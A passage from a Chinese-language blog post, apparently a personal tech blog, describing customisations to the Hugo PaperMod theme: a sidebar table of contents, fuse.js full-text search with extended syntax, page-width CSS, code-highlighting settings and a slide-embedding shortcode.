-}} {{- $cleanedID := replace (replace $id \u0026#34;id=\\\u0026#34;\u0026#34; \u0026#34;\u0026#34;) \u0026#34;\\\u0026#34;\u0026#34; \u0026#34;\u0026#34; }} {{- $header := replaceRE \u0026#34;\u0026lt;h[1-6].*?\u0026gt;((.|\\n])+?)\u0026lt;/h[1-6]\u0026gt;\u0026#34; \u0026#34;$1\u0026#34; $header -}} {{- if ne $i 0 -}} {{- $prevHeaderLevel := index (findRE \u0026#34;[1-6]\u0026#34; (index $headers (sub $i 1)) 1) 0 -}} {{- $prevHeaderLevel := len (seq $prevHeaderLevel) -}} {{- if gt $headerLevel $prevHeaderLevel -}} {{- range seq $prevHeaderLevel (sub $headerLevel 1) -}} \u0026lt;ul\u0026gt; {{/* the first should not be recorded */}} {{- if ne $prevHeaderLevel . -}} {{- $.Scratch.Add \u0026#34;bareul\u0026#34; . -}} {{- end -}} {{- end -}} {{- else -}} \u0026lt;/li\u0026gt; {{- if lt $headerLevel $prevHeaderLevel -}} {{- range seq (sub $prevHeaderLevel 1) -1 $headerLevel -}} {{- if in ($.Scratch.Get \u0026#34;bareul\u0026#34;) . -}} \u0026lt;/ul\u0026gt; {{/* manually do pop item */}} {{- $tmp := $.Scratch.Get \u0026#34;bareul\u0026#34; -}} {{- $.Scratch.Delete \u0026#34;bareul\u0026#34; -}} {{- $.Scratch.Set \u0026#34;bareul\u0026#34; slice}} {{- range seq (sub (len $tmp) 1) -}} {{- $.Scratch.Add \u0026#34;bareul\u0026#34; (index $tmp (sub . 1)) -}} {{- end -}} {{- else -}} \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; {{- end -}} {{- end -}} {{- end -}} {{- end }} \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;#{{- $cleanedID -}}\u0026#34; aria-label=\u0026#34;{{- $header | plainify -}}\u0026#34;\u0026gt;{{- $header | safeHTML -}}\u0026lt;/a\u0026gt; {{- else }} \u0026lt;li\u0026gt; \u0026lt;a href=\u0026#34;#{{- $cleanedID -}}\u0026#34; aria-label=\u0026#34;{{- $header | plainify -}}\u0026#34;\u0026gt;{{- $header | safeHTML -}}\u0026lt;/a\u0026gt; {{- end -}} {{- end -}} \u0026lt;!-- {{- $firstHeaderLevel := len (seq (index (findRE \u0026#34;[1-6]\u0026#34; (index $headers 0) 1) 0)) -}} --\u0026gt; {{- $firstHeaderLevel := $largest }} {{- $lastHeaderLevel := len (seq (index (findRE \u0026#34;[1-6]\u0026#34; (index $headers (sub (len $headers) 1)) 1) 0)) }} \u0026lt;/li\u0026gt; {{- range seq (sub $lastHeaderLevel $firstHeaderLevel) -}} {{- if in ($.Scratch.Get \u0026#34;bareul\u0026#34;) (add . $firstHeaderLevel) }} \u0026lt;/ul\u0026gt; {{- else }} \u0026lt;/ul\u0026gt; \u0026lt;/li\u0026gt; {{- end -}} {{- end }} \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/details\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/aside\u0026gt; \u0026lt;script\u0026gt; let activeElement; let elements; window.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function (event) { checkTocPosition(); elements = document.querySelectorAll(\u0026#39;h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]\u0026#39;); // Make the first header active activeElement = elements[0]; const id = encodeURI(activeElement.getAttribute(\u0026#39;id\u0026#39;)).toLowerCase(); document.querySelector(`.inner ul li a[href=\u0026#34;#${id}\u0026#34;]`).classList.add(\u0026#39;active\u0026#39;); }, false); window.addEventListener(\u0026#39;resize\u0026#39;, function(event) { checkTocPosition(); }, false); window.addEventListener(\u0026#39;scroll\u0026#39;, () =\u0026gt; { // Check if there is an object in the top half of the screen or keep the last item active activeElement = Array.from(elements).find((element) =\u0026gt; { if ((getOffsetTop(element) - window.pageYOffset) \u0026gt; 0 \u0026amp;\u0026amp; (getOffsetTop(element) - window.pageYOffset) \u0026lt; window.innerHeight/2) { return element; } }) || activeElement elements.forEach(element =\u0026gt; { const id = encodeURI(element.getAttribute(\u0026#39;id\u0026#39;)).toLowerCase(); if (element === activeElement){ document.querySelector(`.inner ul li a[href=\u0026#34;#${id}\u0026#34;]`).classList.add(\u0026#39;active\u0026#39;); } else { document.querySelector(`.inner ul li a[href=\u0026#34;#${id}\u0026#34;]`).classList.remove(\u0026#39;active\u0026#39;); } }) }, false); const main = parseInt(getComputedStyle(document.body).getPropertyValue(\u0026#39;--article-width\u0026#39;), 10); const toc = parseInt(getComputedStyle(document.body).getPropertyValue(\u0026#39;--toc-width\u0026#39;), 10); const gap = parseInt(getComputedStyle(document.body).getPropertyValue(\u0026#39;--gap\u0026#39;), 10); function checkTocPosition() { const width = document.body.scrollWidth; if (width - main - (toc * 2) - (gap * 4) \u0026gt; 0) { document.getElementById(\u0026#34;toc-container\u0026#34;).classList.add(\u0026#34;wide\u0026#34;); } else { document.getElementById(\u0026#34;toc-container\u0026#34;).classList.remove(\u0026#34;wide\u0026#34;); } } function getOffsetTop(element) { if (!element.getClientRects().length) { return 0; } let rect = element.getBoundingClientRect(); let win = element.ownerDocument.defaultView; return rect.top + win.pageYOffset; } \u0026lt;/script\u0026gt; {{- end }} \u0026lt;!-- ———————————————— 版权声明：本文为「Sulv\u0026#39;s Blog」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://www.sulvblog.cn/posts/blog/hugo_toc_side/ --\u0026gt; blank.css 添加 \\blog\\assets\\css\\extended\\blank.css\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 :root { --nav-width: 1380px; --article-width: 650px; --toc-width: 300px; } .toc { margin: 0 2px 40px 2px; border: 1px solid var(--border); background: var(--entry); border-radius: var(--radius); padding: 0.4em; } .toc-container.wide { position: absolute; height: 100%; border-right: 1px solid var(--border); left: calc((var(--toc-width) + var(--gap)) * -1); top: calc(var(--gap) * 2); width: var(--toc-width); } .wide .toc { position: sticky; top: var(--gap); border: unset; background: unset; border-radius: unset; width: 100%; margin: 0 2px 40px 2px; } .toc details summary { cursor: zoom-in; margin-inline-start: 20px; padding: 12px 0; } .toc details[open] summary { font-weight: 500; } .toc-container.wide .toc .inner { margin: 0; } .active { font-size: 110%; font-weight: 600; } .toc ul { list-style-type: circle; } .toc .inner { margin: 0 0 0 20px; padding: 0px 15px 15px 20px; font-size: 16px; /*目录显示高度*/ max-height: 83vh; overflow-y: auto; } .toc .inner::-webkit-scrollbar-thumb { /*滚动条*/ background: var(--border); border: 7px solid var(--theme); border-radius: var(--radius); } .toc li ul { margin-inline-start: calc(var(--gap) * 0.5); list-style-type: none; } .toc li { list-style: none; font-size: 0.95rem; padding-bottom: 5px; } .toc li a:hover { color: var(--secondary); } /* ———————————————— 版权声明：本文为「Sulv\u0026#39;s Blog」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://www.sulvblog.cn/posts/blog/hugo_toc_side/ */ 增强全文搜索 默认情况下的搜索只会显示搜索出来的文章名字，增强以后可以可以获得全文搜索功能并高亮匹配字段。中文基本OK，英文的搜索效果需要改进，不知是否有可能搜索某个单词而不是字符。\n在 \\blog\\config.toml 加入： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # 本地搜索 # https://github.com/adityatelange/hugo-PaperMod/wiki/Features#search-page [outputs] home = [ \u0026#34;HTML\u0026#34;, \u0026#34;RSS\u0026#34;, \u0026#34;JSON\u0026#34; ] # fusejs.io通用配置部分 [params.fuseOpts] isCaseSensitive = false tokenize = true matchAllTokens =true shouldSort = true findAllMatches = true includeScore = true includeMatches = true minMatchCharLength = 3 threshold=0.6 keys = [\u0026#39;title\u0026#39;, \u0026#39;permalink\u0026#39;, \u0026#39;content\u0026#39;] distance=0 useExtendedSearch=true # fusejs.io中文搜索配置部分，会根据搜索语言覆盖通用部分的配置 zh_minMatchCharLength = 2 zh_threshold=0.4 # fusejs.io英文搜索配置部分，会根据搜索语言覆盖通用部分的配置 en_minMatchCharLength = 4 en_threshold=0.0 新建以下文件 \\blog\\assets\\js\\fastsearch.js 。import * as params from \u0026#34;@params\u0026#34;; let fuse; // holds our search engine let resList = document.getElementById(\u0026#34;searchResults\u0026#34;); let sInput = document.getElementById(\u0026#34;searchInput\u0026#34;); let first, last, current_elem = null; let resultsAvailable = false; // load our search index window.onload = function () { let xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState === 4) { if (xhr.status === 200) { let data = JSON.parse(xhr.responseText); if (data) { // fuse.js options; check fuse.js website for details let options = { distance: 100, threshold: 0.4, ignoreLocation: true, keys: [\u0026#34;title\u0026#34;, \u0026#34;permalink\u0026#34;, \u0026#34;summary\u0026#34;, \u0026#34;content\u0026#34;], }; fuse = new Fuse(data, options); // build the index from the json file } } else { console.log(xhr.responseText); } } }; xhr.open(\u0026#34;GET\u0026#34;, \u0026#34;../index.json\u0026#34;); xhr.send(); }; function activeToggle(ae) { document.querySelectorAll(\u0026#34;.focus\u0026#34;).forEach(function (element) { // rm focus class element.classList.remove(\u0026#34;focus\u0026#34;); }); if (ae) { ae.focus(); document.activeElement = current_elem = ae; ae.parentElement.classList.add(\u0026#34;focus\u0026#34;); } else { document.activeElement.parentElement.classList.add(\u0026#34;focus\u0026#34;); } } function reset() { resultsAvailable = false; resList.innerHTML = sInput.value = \u0026#34;\u0026#34;; // clear inputbox and searchResults sInput.focus(); // shift focus to input box } // execute search as each character is typed sInput.onkeyup = function (e) { // 把实时搜索改成回车后搜索，避免卡顿 if (e.key !== \u0026#34;Enter\u0026#34;) { return; } // run a search query (for \u0026#34;term\u0026#34;) every time a letter is typed // in the search box if (fuse) { // var before_search = new Date().getTime(); fuse.options = generateFuseOptionAccordingToLanguageOfSearchvalue( fuse.options, this.value.trim() ); const results = fuse.search(this.value.trim()); // the actual query being run using fuse.js // console.log(fuse.options.minMatchCharLength); // console.log(\u0026#34;search cost \u0026#34;,(new Date().getTime() - before_search)/1000),\u0026#39;s\u0026#39;; if (results.length !== 0) { // build our html if result exists let resultSet = \u0026#34;\u0026#34;; // our results bucket // 方法一：原来的做法，只能显示标题 // for (let item in results) { // resultSet += `\u0026lt;li class=\u0026#34;post-entry\u0026#34;\u0026gt;\u0026lt;header class=\u0026#34;entry-header\u0026#34;\u0026gt;${results[item].item.title}\u0026amp;nbsp;»\u0026lt;/header\u0026gt;` + // `\u0026lt;a href=\u0026#34;${results[item].item.permalink}\u0026#34; aria-label=\u0026#34;${results[item].item.title}\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;` // } // 方法二：自定义的可行的方法，高亮匹配内容，但是方向键不生效 // resList.innerHTML = resultSet; // renderSearchResults(results); // 方法三：效果相当不错的，修复了方向键不好使的问题 resultSet = renderSearchResults2(results); resList.innerHTML = resultSet; resultsAvailable = true; first = resList.firstChild; last = resList.lastChild; } else { resultsAvailable = false; resList.innerHTML = \u0026#34;sorry we found nothing (；′⌒`)\u0026#34;; } } }; sInput.addEventListener(\u0026#34;search\u0026#34;, function (e) { // clicked on x if (!this.value) reset(); }); // kb bindings document.onkeydown = function (e) { let key = e.key; let ae = document.activeElement; let inbox = document.getElementById(\u0026#34;searchbox\u0026#34;).contains(ae); if (ae === sInput) { let elements = document.getElementsByClassName(\u0026#34;focus\u0026#34;); while (elements.length \u0026gt; 0) { elements[0].classList.remove(\u0026#34;focus\u0026#34;); } } else if (current_elem) ae = current_elem; if (key === \u0026#34;Escape\u0026#34;) { reset(); } else if (!resultsAvailable || !inbox) { return; } else if (key === \u0026#34;ArrowDown\u0026#34;) { e.preventDefault(); if (ae == sInput) { // if the currently focused element is the search input, focus the \u0026lt;a\u0026gt; of first \u0026lt;li\u0026gt; activeToggle(resList.firstChild.lastChild); } else if (ae.parentElement != last) { // if the currently focused element\u0026#39;s parent is last, do nothing // otherwise select the next search result activeToggle(ae.parentElement.nextSibling.lastChild); } } else if (key === \u0026#34;ArrowUp\u0026#34;) { e.preventDefault(); if (ae.parentElement == first) { // if the currently focused element is first item, go to input box activeToggle(sInput); } else if (ae != sInput) { // if the currently focused element is input box, do nothing // otherwise select the previous search result activeToggle(ae.parentElement.previousSibling.lastChild); } } else if (key === \u0026#34;ArrowRight\u0026#34;) { ae.click(); // click on active link } }; // 方法二使用的函数，暂时不要删除 function renderSearchResults(results) { if (results.length \u0026gt; 0) { // Clear the previous search results resList.innerHTML = \u0026#34;\u0026#34;; // Loop through each search result item results.forEach(function (item) { var hilighted_content = \u0026#34;\u0026#34;; // Get the matched part of the title var title = item.item.title; var titleMatches = item.matches.filter(function (match) { return match.key === \u0026#34;title\u0026#34;; }); if (titleMatches.length \u0026gt; 0) { hilighted_content = \u0026#34;title: \u0026#34; + highlightMatch(titleMatches[0].value, titleMatches[0].indices); // Create a new list item element to display the search result var li = document.createElement(\u0026#34;li\u0026#34;); var a = document.createElement(\u0026#34;a\u0026#34;); a.href = item.item.permalink; a.innerText = item.item.title; a.style = \u0026#34;font-weight: bold\u0026#34;; li.appendChild(a); li.appendChild(document.createElement(\u0026#34;br\u0026#34;)); // Create a new paragraph element to display the matched text var p = document.createElement(\u0026#34;p\u0026#34;); p.innerHTML = hilighted_content; li.appendChild(p); // Add the list item to the search results list resList.appendChild(li); return; } // // Get the matched part of the description // var description = item.description || \u0026#39;\u0026#39;; // var descriptionMatches = item.matches.filter(function(match) { // return match.key === \u0026#39;description\u0026#39;; // }); // if (descriptionMatches.length \u0026gt; 0) { // description = highlightMatch(description, descriptionMatches[0].indices); // } // Get the matched part of the content var content = item.content || \u0026#34;\u0026#34;; var contentMatches = item.matches.filter(function (match) { return match.key === \u0026#34;content\u0026#34;; }); if (contentMatches.length \u0026gt; 0) { hilighted_content = highlightMatch( contentMatches[0].value, contentMatches[0].indices ); // Create a new list item element to display the search result var li = document.createElement(\u0026#34;li\u0026#34;); var a = document.createElement(\u0026#34;a\u0026#34;); // console.log(\u0026#34;item:\u0026#34;,item) a.href = item.item.permalink; a.innerText = item.item.title; a.style = \u0026#34;font-weight: bold\u0026#34;; li.appendChild(a); li.appendChild(document.createElement(\u0026#34;br\u0026#34;)); // Create a new paragraph element to display the matched text var p = document.createElement(\u0026#34;p\u0026#34;); p.innerHTML = hilighted_content; li.appendChild(p); // Add the list item to the search results list resList.appendChild(li); return; } }); } } function renderSearchResults2(results) { var tmp_resList = document.createElement(\u0026#34;ul\u0026#34;); var matched_essay_num = 0; var matched_text_num = 0; if (results.length \u0026gt; 0) { // Clear the previous search results tmp_resList.innerHTML = \u0026#34;\u0026#34;; // Loop through each search result item results.forEach(function (item) { var hilighted_content = \u0026#34;\u0026#34;; var titleMatches = item.matches.filter(function (match) { return match.key === \u0026#34;title\u0026#34;; }); if (titleMatches.length \u0026gt; 0) { hilighted_content = highlightMatch( titleMatches[0].value, titleMatches[0].indices ); matched_text_num += titleMatches[0].indices.length; li = `\u0026lt;li class=\u0026#34;post-entry\u0026#34;\u0026gt;\u0026lt;header class=\u0026#34;entry-header\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;${item.item.title}\u0026amp;nbsp;»\u0026lt;/header\u0026gt;`; var p = document.createElement(\u0026#34;p\u0026#34;); p.innerHTML = hilighted_content; li += p.innerHTML; li += `\u0026lt;a href=\u0026#34;${item.item.permalink}\u0026#34; aria-label=\u0026#34;${item.item.title}\u0026#34; \u0026gt;\u0026lt;/a\u0026gt;`; li += \u0026#34;\u0026lt;/li\u0026gt;\u0026#34;; tmp_resList.innerHTML += li; } // Get the matched part of the content var contentMatches = item.matches.filter(function (match) { return match.key === \u0026#34;content\u0026#34;; }); if (contentMatches.length \u0026gt; 0) { hilighted_content = highlightMatch( contentMatches[0].value, contentMatches[0].indices ); matched_text_num += contentMatches[0].indices.length; li = `\u0026lt;li class=\u0026#34;post-entry\u0026#34;\u0026gt;\u0026lt;header class=\u0026#34;entry-header\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;${item.item.title}\u0026amp;nbsp;»\u0026lt;/header\u0026gt;`; var p = document.createElement(\u0026#34;p\u0026#34;); p.innerHTML = hilighted_content; li += p.innerHTML; li += `\u0026lt;a href=\u0026#34;${item.item.permalink}\u0026#34; aria-label=\u0026#34;${item.item.title}\u0026#34; \u0026gt;\u0026lt;/a\u0026gt;`; li += \u0026#34;\u0026lt;/li\u0026gt;\u0026#34;; tmp_resList.innerHTML += li; } matched_essay_num += titleMatches.length + contentMatches.length; }); } total_matched_notice = `\u0026lt;li class=\u0026#34;post-entry\u0026#34;\u0026gt;\u0026lt;header class=\u0026#34;entry-header\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;共找到 ${matched_essay_num} 篇文章，包含 ${matched_text_num} 处匹配\u0026lt;/header\u0026gt;\u0026lt;a href=\u0026#34;\u0026#34; aria-label=\u0026#34;\u0026#34; \u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;`; tmp_resList.innerHTML = total_matched_notice + tmp_resList.innerHTML; return tmp_resList.innerHTML; } function highlightMatch(text, indices) { if (text == undefined) { return \u0026#34;\u0026#34;; } var hilighted_content = \u0026#34;\u0026#34;; var around_letters_num = 25; for (let index = 0; index \u0026lt; indices.length; index++) { const element = indices[index]; var start = element[0]; var end = element[1]; hilighted_content += \u0026#34;\u0026lt;p\u0026gt;\u0026#34;; hilighted_content += text.substring(Math.max(start - around_letters_num, 0), start) + \u0026#39;\u0026lt;span style=\u0026#34;background-color: yellow;font-weight: bold;\u0026#34;\u0026gt;\u0026#39; + text.substring(start, end + 1) + \u0026#34;\u0026lt;/span\u0026gt;\u0026#34; + text.substring(end + 1, Math.min(end + around_letters_num, text.length)); hilighted_content += \u0026#34;\u0026lt;/p\u0026gt;\u0026lt;/br\u0026gt;\u0026#34;; } return hilighted_content; } function idLanguage(query) { const chineseStringRegex = /^[\\u4e00-\\u9fa5]+$/; // Matches Chinese string const chineseCharRegex = /[\\u4e00-\\u9fa5]/; // Matches any Chinese character if (chineseStringRegex.test(query)) { return \u0026#34;allzh\u0026#34;; // 全中文 } else if (!chineseCharRegex.test(query)) { return \u0026#34;nozh\u0026#34;; // 无中文 } return \u0026#34;others\u0026#34;; //中英混合或者其他 } function generateFuseOptionAccordingToLanguageOfSearchvalue( originalOptions, searchValue ) { // 参考 https://fusejs.io/api/options.html if (params.fuseOpts) { // 通用配置 adaptedOptions = { isCaseSensitive: params.fuseOpts.iscasesensitive ?? false, includeScore: params.fuseOpts.includescore ?? false, includeMatches: params.fuseOpts.includematches ?? false, minMatchCharLength: params.fuseOpts.minmatchcharlength ?? 1, shouldSort: params.fuseOpts.shouldsort ?? true, findAllMatches: params.fuseOpts.findallmatches ?? false, keys: params.fuseOpts.keys ?? [ \u0026#34;title\u0026#34;, \u0026#34;permalink\u0026#34;, \u0026#34;summary\u0026#34;, \u0026#34;content\u0026#34;, ], location: params.fuseOpts.location ?? 0, threshold: params.fuseOpts.threshold ?? 0.4, distance: params.fuseOpts.distance ?? 100, ignoreLocation: params.fuseOpts.ignorelocation ?? false, useExtendedSearch: params.fuseOpts.useextendedsearch ?? false, }; let searchValueLanguage = idLanguage(searchValue); if (searchValueLanguage == \u0026#34;allzh\u0026#34;) { // 如果全都是中文，使用这个配置 adaptedOptions.minMatchCharLength = params.fuseOpts.zh_minmatchcharlength ?? adaptedOptions.minMatchCharLength; } else if (searchValueLanguage == \u0026#34;nozh\u0026#34;) { // 如果没有中文，使用这个配置 adaptedOptions.minMatchCharLength = params.fuseOpts.en_minmatchcharlength ?? adaptedOptions.minMatchCharLength; } else if (searchValueLanguage == \u0026#34;others\u0026#34;) { // do nothing // 暂时保持通用配置，比较均衡 // to be considered } console.log(adaptedOptions); // console.log(params.fuseOpts) return adaptedOptions; } return originalOptions; } fusejs.io运行时调整搜索选项，如果是中文则减小minMatchCharLength 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 function generateFuseOptionAccordingToLanguageOfSearchvalue( originalOptions, searchValue ) { // 参考 https://fusejs.io/api/options.html if (params.fuseOpts) { // 通用配置 adaptedOptions = { ignoreLocation: params.fuseOpts.ignorelocation ?? true, // distance: params.fuseOpts.distance ?? 100, // threshold: params.fuseOpts.threshold ?? 0.4, // location: params.fuseOpts.location ?? 0, isCaseSensitive: params.fuseOpts.iscasesensitive ?? false, tokenize: params.fuseOpts.tokenize ?? true, matchAllTokens: params.fuseOpts.matchalltokens ?? true, shouldSort: params.fuseOpts.shouldsort ?? true, findAllMatches: params.fuseOpts.findallmatches ?? true, includeScore: params.fuseOpts.includescore ?? true, includeMatches: params.fuseOpts.includematches ?? true, minMatchCharLength: params.fuseOpts.minmatchcharlength ?? 3, keys: params.fuseOpts.keys ?? [ \u0026#34;title\u0026#34;, \u0026#34;permalink\u0026#34;, \u0026#34;summary\u0026#34;, \u0026#34;content\u0026#34;, ], useExtendedSearch: params.fuseOpts.useextendedsearch ?? false, }; let searchValueLanguage = idLanguage(searchValue); if (searchValueLanguage == \u0026#34;allzh\u0026#34;) { // 如果全都是中文，使用这个配置 adaptedOptions.minMatchCharLength = params.fuseOpts.zh_minmatchcharlength ?? adaptedOptions.minMatchCharLength; } else if (searchValueLanguage == \u0026#34;nozh\u0026#34;) { // 如果没有中文，使用这个配置 adaptedOptions.minMatchCharLength = params.fuseOpts.en_minmatchcharlength ?? adaptedOptions.minMatchCharLength; } else if (searchValueLanguage == \u0026#34;others\u0026#34;) { // do nothing // 暂时保持通用配置，比较均衡 // to be considered } console.log(adaptedOptions); // console.log(params.fuseOpts) return adaptedOptions; } return originalOptions; } 设置 ignoreLocation = true 阅读搜索原理 https://fusejs.io/concepts/scoring-theory.html#scoring-theory ，了解 ignoreLocation选项会影响是否考虑distance/threshold/location，我们不关心匹配字段出现在离开头多远的地方，我们想要全文搜索，所以只要直接设置这一项为true就可以了。下面三项也没有了设置的意义。\n1 2 3 # distance=0 # threshold=0.6 # location=0 useExtendedSearch不起作用 根据 Explanation of Different Builds ，fusejs.io 有不同版本。Papermod7.0自带的是 fuse.basic.min.js 属于basic版本，只具备fuzzy search功能。\nUMD CommonJS ES Module (for bundlers) Full fuse.js fuse.common.js fuse.esm.js Basic fuse.basic.js fuse.basic.common.js fuse.basic.esm.js Full (Production) fuse.min.js - fuse.esm.min.js Basic (Production) fuse.basic.min.js - fuse.basic.esm.min.js Full: Builds that contain standard fuzzy searching, extended searching, and logical query operations. These builds are larger. Basic: Builds that contain only standard fuzzy searching. UMD (opens new window): UMD builds can be used directly in the browser via a \u0026lt;script\u0026gt; tag. The default file from jsDelivr CDN at https://cdn.jsdelivr.net/npm/fuse.js is the UMD build (fuse.js). 所以我们选择 Full的UDM版本，https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js 。下载下来以后重命名为 fuse.basic.min.js 并放在 `\\blog\\assets\\js下，就可以覆盖PaperMod原有的js文件了。这样useExtendedSearch就能工作了。\n有了ExtendedSearch以后，前面针对不同语言设置不同 minMatchCharLength 的操作也大可不必了。记录一份扩展搜索的语法和一些注意事项。\n=\u0026quot;scheme language\u0026quot; 表示从头到尾完全匹配，一般都匹配不上，除非是配置了链接的搜索，然后搜类似 =\u0026quot;http://localhost:1313/post/230509-brandnew-blog-based-on-hugo-and-githubci/\u0026quot; 用得最多的还是 'python 和 '\u0026quot;python -c\u0026quot; 。 如果有空格，字符串需要用双引号包裹，单引号不行。 ExtendedSearch_doc 以下摘自：https://fusejs.io/examples.html#extended-search 。\nWhite space acts as an AND operator, while a single pipe (|) character acts as an OR operator. To escape white space, use double quote ex. =\u0026quot;scheme language\u0026quot; for exact match.\nToken Match type Description jscript fuzzy-match Items that fuzzy match jscript =scheme exact-match Items that are scheme 'python include-match Items that include python !ruby inverse-exact-match Items that do not include ruby ^java prefix-exact-match Items that start with java !^earlang inverse-prefix-exact-match Items that do not start with earlang .js$ suffix-exact-match Items that end with .js !.go$ inverse-suffix-exact-match Items that do not end with .go 改造搜索框默认行为 默认使用include-match语法，在输入的字符串周围加上符号，把xxxxx 变成 '\u0026quot;xxxxx\u0026quot; 。如果要使用原生的扩展搜索语法，则需要输入 r:xxxxx ，搜索框会自动去掉开头的 r: 。\n修改页面宽度 复制文件 \\blog\\themes\\hugo-PaperMod-7.0\\assets\\css\\core\\theme-vars.css 到 \\blog\\assets\\css\\core\\theme-vars.css，并修改 --main-width: 的值\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 :root { --gap: 24px; --content-gap: 20px; --nav-width: 1024px; --main-width: 60%; /* 修改此处调整博客页面总宽度，初始值是720px*/ --header-height: 60px; --footer-height: 60px; --radius: 8px; --theme: rgb(255, 255, 255); --entry: rgb(255, 255, 255); --primary: rgb(30, 30, 30); --secondary: rgb(108, 108, 108); --tertiary: rgb(214, 214, 214); --content: rgb(31, 31, 31); --hljs-bg: rgb(28, 29, 33); --code-bg: rgb(245, 245, 245); --border: rgb(238, 238, 238); } .dark { --theme: rgb(29, 30, 32); --entry: rgb(46, 46, 51); --primary: rgb(218, 218, 219); --secondary: rgb(155, 156, 157); --tertiary: rgb(65, 66, 68); --content: rgb(196, 196, 197); --hljs-bg: rgb(46, 46, 51); --code-bg: rgb(55, 56, 62); --border: rgb(51, 51, 51); } .list { background: var(--code-bg); } .dark.list { background: var(--theme); } 代码显示效果 高亮行号等配置 在 \\blog\\config.toml 加入：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # https://gohugo.io/getting-started/configuration-markup/#highlight # https://gohugo.io/content-management/syntax-highlighting/#generate-syntax-highlighter-css # https://gohugo.io/content-management/syntax-highlighting/#highlight-shortcode [markup] [markup.highlight] anchorLineNos = true # 给每行代码提供一个锚点 codeFences = true # 是否提供代码块边框 ，不要关闭，太丑了 guessSyntax = true # 是否猜测语法。开启后没有标明语言的代码块也可以得到code fence hl_Lines = \u0026#39;\u0026#39; # 高亮哪些行，可以具体控制 hl_inline = false # 不要开启，太丑了 lineAnchors = \u0026#39;\u0026#39; lineNoStart = 1 lineNos = true lineNumbersInTable = true noClasses = true # 如果是false，需要自己生成syntax.css noHl = false style = \u0026#39;monokai\u0026#39; tabWidth = 4 code fence微调 可以控制显示的起始行号和特别高亮的行数，例如这样的原始代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ```toml {hl_lines=[3,\u0026#34;9-11\u0026#34;],linenostart=199} [markup] [markup.highlight] anchorLineNos = false codeFences = true guessSyntax = false hl_Lines = \u0026#39;\u0026#39; hl_inline = false lineAnchors = \u0026#39;\u0026#39; lineNoStart = 1 lineNos = true lineNumbersInTable = true noClasses = true noHl = false style = \u0026#39;monokai\u0026#39; tabWidth = 4 ​``` 显示效果是这样的\n199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 [markup] [markup.highlight] anchorLineNos = false codeFences = true guessSyntax = false hl_Lines = \u0026#39;\u0026#39; hl_inline = false lineAnchors = \u0026#39;\u0026#39; lineNoStart = 1 lineNos = true lineNumbersInTable = true noClasses = true noHl = false style = \u0026#39;monokai\u0026#39; tabWidth = 4 效果不算特别好，但也能用。\n配置值参考 https://gohugo.io/content-management/syntax-highlighting/#highlight-shortcode 。\n代码块折叠 方案一 使用内置的rawhtml 这个shortcode\n原始代码（删除REMOVEME）\n1 2 3 4 5 6 7 8 9 10 {{REMOVEME\u0026lt; rawhtml \u0026gt;}} \u0026lt;details\u0026gt; \u0026lt;summary\u0026gt;展开查看\u0026lt;/summary\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;code\u0026gt; System.out.println(\u0026#34;Hello\u0026#34;); \u0026lt;/code\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;/details\u0026gt; {{REMOVEME\u0026lt; /rawhtml \u0026gt;}} 最终效果\n展开查看 System.out.println(\"Hello\"); 🔨方案二 参考 https://jiridj.be/posts/collapsible-code-block/ 没成功\n🔨代码块显示语言类型 🔨高亮主题选择 可选的有这些：https://xyproto.github.io/splash/docs/all.html\nhttps://gohugo.io/content-management/syntax-highlighting/\n🔨全局字体修改 添加编辑链接，直达github dev，在线修改 在 \\blog\\config.toml 加入：\n1 2 3 4 [params.editPost] URL = \u0026#34;https://github.dev/findneo/priblog/content\u0026#34; Text = \u0026#34;edit\u0026#34; appendFilePath = true 自定义shortcode，插入并预览PDF/PPT 参考此文：Hugo博客自定义shortcodes | Sulv\u0026rsquo;s Blog\n添加 blog\\layouts\\shortcodes\\ppt.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; #googleslides_shortcodes { padding-bottom: 66%; position: relative; display: block; width: 100%; border-bottom: 5px solid; } #googleslides_shortcodes iframe { position: absolute; top: 0; left: 0 } \u0026lt;/style\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div 